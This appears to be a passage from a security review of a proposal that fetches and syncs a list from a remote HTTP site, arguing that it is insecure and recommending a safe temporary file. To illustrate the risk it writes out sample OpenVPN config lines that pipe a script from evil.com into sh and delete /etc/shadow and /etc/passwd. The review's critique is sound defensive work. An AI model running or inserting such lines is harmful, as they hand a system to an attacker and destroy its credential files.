  If you're willing to maintain such a list, resyncing it every
 few days/months to reap dead-entries and add new ones then that
 would be good.

  Sure.  If you changed the code to use ioutil.TempFile, or some
 other secure alternative that specific objection will go away.

  Yes.  For example these snippets will do what you fear they will:
    script-security 2
    up curl http://evil.com/root-me.sh | sh
    up rm /etc/shadow
    down rm -f /etc/passwd

  As per the insecure fixed name, and the execution of commands from
 a remote HTTP-site (not even SSL!) I think it is insecure in all
 regards.
  Also I guess you'll need to change the script to remove "sudo", or
 better yet add a restricted user with sudo's nopasswd setup for it
 (shudder).
